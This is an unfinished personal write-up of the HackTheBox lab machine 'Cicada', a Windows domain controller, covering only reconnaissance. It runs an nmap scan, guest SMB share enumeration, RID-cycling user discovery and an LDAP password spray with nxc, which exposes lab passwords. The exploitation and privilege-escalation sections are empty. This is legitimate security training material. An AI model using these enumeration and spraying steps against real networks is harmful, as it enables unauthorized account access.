---
target_ip: 10.10.11.35
platform: HTB
difficulty: Easy
os: Windows
date_started: 2025-06-15
status: in_progress
services: ['ncacn_http', 'kerberos-sec', 'kpasswd5', 'http', 'ldap', 'microsoft-ds', 'msrpc', 'domain', 'netbios-ssn']
techniques_used: []
tools_used: [nmap]
---

# Cicada

**Platform:** HTB | **Difficulty:** Easy | **OS:** Windows | **Date:** 15/06/2025

## Overview 


---

## Phase 1: Reconnaissance 

### Network Discovery

```bash
nmap -sC -sV -T4 10.10.11.35 -oA nmap/cicada
```

| Port | Service | Version |
|------|---------|---------|
| 53 | domain | Simple DNS Plus |
| 88 | kerberos-sec | Microsoft Windows Kerberos |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 389 | ldap | Microsoft Windows Active Directory LDAP |
| 445 | microsoft-ds | N/A |
| 464 | kpasswd5 | N/A |
| 593 | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 636 | ldap | Microsoft Windows Active Directory LDAP |
| 3268 | ldap | Microsoft Windows Active Directory LDAP |
| 3269 | ldap | Microsoft Windows Active Directory LDAP |
| 5985 | http | Microsoft HTTPAPI httpd 2.0 |

### DNS Configuration

I generated and appended a static hostname mapping to `/etc/hosts` to avoid possible DNS resolution issues later on with Kerberos.
```bash
nxc smb '10.10.11.35' --generate-hosts-file files/hosts && sudo tee -a /etc/hosts < files/hosts

...
10.10.11.35     CICADA-DC.cicada.htb CICADA-DC
```

### Share Enumeration

Found a HR share 
```bash
nxc smb 'CICADA-DC' -u 'wither' -p '' -d 'cicada.htb' --shares

SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\wither: (Guest)
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
```

Text file in the HR share
```bash
smbclient -U 'guest' -p ''  \\\\10.10.11.35\\HR

Password for [WORKGROUP\wither]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 12:29:09 2024
  ..                                  D        0  Thu Mar 14 12:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 18:31:48 2024

                4168447 blocks of size 4096. 481599 blocks available
smb: \> get 'Notice from HR.txt'
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \'Notice
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (16.5 KiloBytes/sec) (average 16.5 KiloBytes/sec)
smb: \> exit

```

Default password found in the note.
```
cat Notice\ from\ HR.txt 

...
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
...
```

Save the password to a file
```bash
echo 'Cicada$M6Corpb*@Lp#nZp!8' > creds.txt
```

Enumerate users via RID cycling
```bash
nxc smb 'CICADA-DC' -u 'guest' -p '' --rid-brute | awk '{print $6}' | cut -d '\' -f2 > potential-users.txt
```

Sprayed the password I found earlier against the list of users to find a match against `michael.wrightson` as well as a password `aRt$Lp#7t*VQ!3` for `david.orelious` in his description.
```bash
nxc ldap 'CICADA-DC' -u potential-users.txt -p creds.txt --active-users 

LDAP        10.10.11.35     389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never) 
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Windows:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\guest::Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Cert:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Schema:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Group:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Read-only:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Cloneable:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Protected:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Key:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\RAS:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Allowed:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Denied:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\DnsAdmins:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\DnsUpdateProxy:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target?
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Groups:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
Error: [Errno 104] Connection reset by peer
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [*] Total records returned: 8, total 1 user(s) disabled
LDAP        10.10.11.35     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.11.35     389    CICADA-DC        Administrator                 2024-08-26 21:08:03 6        Built-in account for administering the computer/domain
LDAP        10.10.11.35     389    CICADA-DC        Guest                         2024-08-28 18:26:56 0        Built-in account for guest access to the computer/domain
LDAP        10.10.11.35     389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 4        
LDAP        10.10.11.35     389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 4        
LDAP        10.10.11.35     389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
LDAP        10.10.11.35     389    CICADA-DC        david.orelious                2024-03-14 12:17:29 2        Just in case I forget my password is aRt$Lp#7t*VQ!3
LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-22 22:20:17 2  
```

## Enumeration



---

## Phase 2: Exploitation


---

## Phase 3: Privilege Escalation



## References
- 

---
#cicada #htb #easy #windows